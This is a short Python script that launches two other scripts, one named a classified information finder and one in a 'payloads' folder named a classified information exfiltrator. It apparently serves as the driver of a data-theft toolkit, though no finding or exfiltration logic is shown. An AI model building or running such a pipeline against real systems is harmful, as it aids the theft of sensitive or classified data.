import subprocess
import os

def main():
    # Run the classified info finder
    classified_info_finder_path = os.path.join(os.path.dirname(__file__), "tools", "classified_info_finder.py")
    subprocess.run(["python3", classified_info_finder_path])

    # Run the classified info exfiltrator
    classified_info_exfiltrator_path = os.path.join(os.path.dirname(__file__), "payloads", "classified_info_exfiltrator.py")
    subprocess.run(["python3", classified_info_exfiltrator_path])

if __name__ == "__main__":
    main()
